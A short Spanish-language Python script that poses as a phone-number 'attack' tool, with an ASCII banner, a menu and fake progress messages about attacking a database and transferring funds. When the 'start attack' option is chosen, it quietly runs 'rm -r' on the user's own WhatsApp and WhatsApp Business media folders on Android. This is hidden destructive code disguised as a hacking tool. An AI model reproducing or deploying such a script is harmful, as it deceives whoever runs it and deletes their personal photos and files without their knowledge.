#-*-coding: utf-8 -*-
## Módulos a importar
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
print("""Esta herramienta a sido creada con fines experimentales
no somos responsables del mal uso de la misma!""")
time.sleep(4)
clearConsole()
def menu():
    print("█▀▀ █▀█ █▀▀ █▀▀   █░█░█ █ █▀▀ █ ▄▄ █▀▀ ▄▀█ █░░ █░░")
    print("█▀░ █▀▄ ██▄ ██▄   ▀▄▀▄▀ █ █▀░ █ ░░ █▄▄ █▀█ █▄▄ █▄▄")
    print("                                By Mr Star")
    r=int(input("""Menú:
    1-Ingresar número
    2-Iniciar ataque
    $: """))
    if r==1:
        input("Ingrese número telefónico: ")
        print("Número guardado")
        time.sleep(2)
        clearConsole()
        menu()
    else:
        print("Iniciando ataque a la base de datos")
        time.sleep(3)
        print("Éxito")
        time.sleep(1)
        print("Iniciando transferencia de fondos")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp.w4b")
        time.sleep(8)
        print("Éxito")
        time.sleep(1)
        print("Ataque exitoso")

menu()
